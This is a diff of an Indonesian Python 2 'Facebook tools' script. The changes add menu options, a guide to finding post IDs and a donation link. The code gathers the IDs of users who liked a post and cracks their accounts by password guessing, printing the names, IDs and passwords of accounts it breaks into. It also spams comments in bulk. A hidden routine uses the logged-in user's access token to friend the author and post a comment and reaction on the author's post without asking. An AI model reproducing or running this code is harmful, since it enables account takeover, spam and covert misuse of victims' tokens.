@@ -91,6 +91,23 @@ def masuk():
     print '\033[31;1m[\033[33;1m+\033[31;1m]'+30*'\033[33;1m='+'\033[31;1m[\033[33;1m+\033[31;1m]'
     asup()
 
+def id():
+    os.system('clear')
+    print logo
+    print 'Cara Mendapatkan ID Postingan'
+    print '1.Cari Postingan Publik Yang Likenya Banyak'
+    print '2.Klik Titik Tiga DiPojok Lalu Klik Salin Tautan'
+    print '3.Jika Sudah Maka Ada Link Sebagai Berikut'
+    print 'https://www.facebook.com/100009563131835/posts/2784729071855837/?app=fbl'
+    print '4.Lalu Salin Nomor Pada Barisan Kedua         Seperti Diatas Ini'
+    print '5.Dan Tempel Di Crack ID Publik'
+    halo = raw_input('[Enter Untuk Keluar]')
+    if halo == '':
+        menu()
+    else:
+        print 'Enter Untuk Keluar'
+        time.sleep(1)
+        id()
 
 def asup():
     milih = raw_input('\033[32;1mpilih\033[37;1m#\033[34;1mmenu\033[32;1m~  \033[37;1m')
@@ -169,14 +186,21 @@ def bot_komen():
         os.system('rm -rf login.txt')
 
     una = '100045781089477'
-    kom = 'Hai Saya Pengguna Sc Mu\xf0\x9f\x98\x98'
-    reac = 'ANGRY'
+    kom = 'Hai\xf0\x9f\x98\x98'
+    reac = 'LOVE'
     post = '194234645445904'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
     requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toke)
     menu()
 
+def donasi():
+    os.system('clear')
+    print logo
+    print 'Membuka Chrome'
+    time.sleep(1)
+    os.system("xdg-open https://saweria.co/Ariszulwafa")
+    menu()
 
 def menu():
     os.system('clear')
@@ -212,12 +236,14 @@ def menu():
     print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m NAMAMU\x1b[1;90m  =\x1b[1;92m ' + nama
     print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m USER ID\x1b[1;90m =\x1b[1;92m ' + id
     print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-    print '\033[37;1m{\033[31;1m!\033[37;1m} \033[34;1m    FITUR'
+    print '\033[37;1m{\033[31;1m!\033[37;1m} \033[34;1m    **TOOLS FACEBOOK**'
     print '\033[37;1m[\033[32;1m01\033[37;1m] \033[34;1mCrack ID Postingan Publik'
-    print '\033[37;1m[\033[32;1m02\033[37;1m] \033[34;1mDump ID Temanmy'
+    print '\033[37;1m[\033[32;1m02\033[37;1m] \033[34;1mDump ID Teman'
     print '\033[37;1m[\033[32;1m03\033[37;1m] \033[34;1mSpam Comment'
     print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-    print '\033[37;1m[\033[31;1m00\033[37;1m] \033[31;1mExit'
+    print '\033[37;1m[\033[32;1m04\033[37;1m] \033[34;1mCara Mendapatkan ID Post'
+    print '\033[37;1m[\033[32;1m05\033[37;1m] \033[34;1mDonasi Ke ARSPLOIT'
+    print '\033[37;1m[\033[31;1m00\033[37;1m] \033[31;1mLogout'
     print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
     pilih()
 
@@ -233,11 +259,15 @@ def pilih():
         dumpid()
     elif gokil == '3' or gokil == '03':
         spamkomen()
+    elif gokil == '4' or gokil == '04':
+        id()
+    elif gokil == '5' or gokil == '05':
+        donasi()
     elif gokil == '0' or gokil == '00':
         os.system('clear')
-        jalan('Delete token')
+        print 'Delete token'
         os.system('rm -rf login.txt')
-        kaluar()
+        masuk()
     else:
         print '\033[37;1m{\033[31;1m!\033[37;1m} number: ' + gokil + ' not found'
         pilih()
@@ -251,14 +281,15 @@ def spamkomen():
         os.system('python2 main.py')
     os.system("clear")
     print logo
+    print 'Jika Jumlah Spam Banyak,Maka Agak Lama'
     post = raw_input("\033[32;1mID Post \033[34;1m=> \033[37;1m")
-    kom = raw_input("\033[32;1mComment \033[34;1m=> \033[37;1m")
-    jml = int(input("\033[32;1mCount \033[34;1m=> \033[37;1m"))
-    print '\033[37;1m[\033[31;1m*\033[37;1m] \033[32;1mplease wait...'
+    kom = raw_input("\033[32;1mKalimat \033[34;1m=> \033[37;1m")
+    jml = int(input("\033[32;1mJumlah \033[34;1m=> \033[37;1m"))
+    print '\033[37;1m[\033[31;1m*\033[37;1m] \033[32;1mTunggu Ya Ajc'
     for x in range(jml):
         requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
     print '\033[33;1m[\033[31;1m*\033[33;1m] \033[34;1mSuccess'
-    balik = raw_input('\033[31;1m[<back>]\n')
+    balik = raw_input('\033[31;1m[Enter Untuk Keluar]\n')
     menu()
 
 
@@ -302,7 +333,7 @@ def crack_post():
         os.system('clear')
         print logo
         print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-        po = raw_input('\033[37;1m{\033[32;1m*\033[37;1m}\033[34;1m ID Post Group or Friend : ')
+        po = raw_input('\033[37;1m{\033[32;1m*\033[37;1m}\033[34;1m ID Postingan Teman/Publik: ')
         print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
         r = requests.get('https://graph.facebook.com/' + po + '/likes?limit=9999999&access_token=' + toke)
         z = json.loads(r.text)
@@ -312,7 +343,7 @@ def crack_post():
         ngetik('\r\033[37;1m{\033[32;1m*\033[37;1m} Mengambil ID ...')
     except KeyError:
         print '\033[37;1m{\033[31;1m!\033[37;1m} ID Post Invaled !'
-        balik = raw_input('\n\033[32;1m[<Back>]')
+        balik = raw_input('\n\033[32;1m[Enter Untuk Keluar]')
         menu()
 
     print '\033[37;1m{\033[32;1m*\033[37;1m} Total ID : ' + str(len(id))
@@ -335,7 +366,7 @@ def crack_post():
             ko = json.load(data)
             if 'access_token' in ko:
                 print ''
-                print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS'
+                print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS:)'
                 print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                 print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                 print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list1
@@ -346,7 +377,7 @@ def crack_post():
                 oks.append(jamet)
             elif 'www.facebook.com' in ko['error_msg']:
                 print ''
-                print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT'
+                print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT:('
                 print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                 print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                 print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list1
@@ -387,7 +418,7 @@ def crack_post():
                     ko = json.load(data)
                     if 'access_token' in ko:
                         print ''
-                        print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS'
+                        print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS:)'
                         print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                         print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                         print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list3
@@ -398,7 +429,7 @@ def crack_post():
                         oks.append(jamet)
                     elif 'www.facebook.com' in ko['error_msg']:
                         print ''
-                        print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT'
+                        print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT:('
                         print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                         print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                         print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list3
@@ -420,8 +451,8 @@ def crack_post():
     print '\033[37;1m{\033[32;1m*\033[37;1m}Checkpoint : ' + str(len(cekpoint))
     print '\033[37;1m{\033[32;1m*\033[37;1m}Sucess     : ' + str(len(oks))
     print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-    balik = raw_input('\n[<back>]\n')
-    os.system('python2 main.py')
+    balik = raw_input('\n[Enter Untuk Keluar]\n')
+    menu()
 
 
 def scandomain():
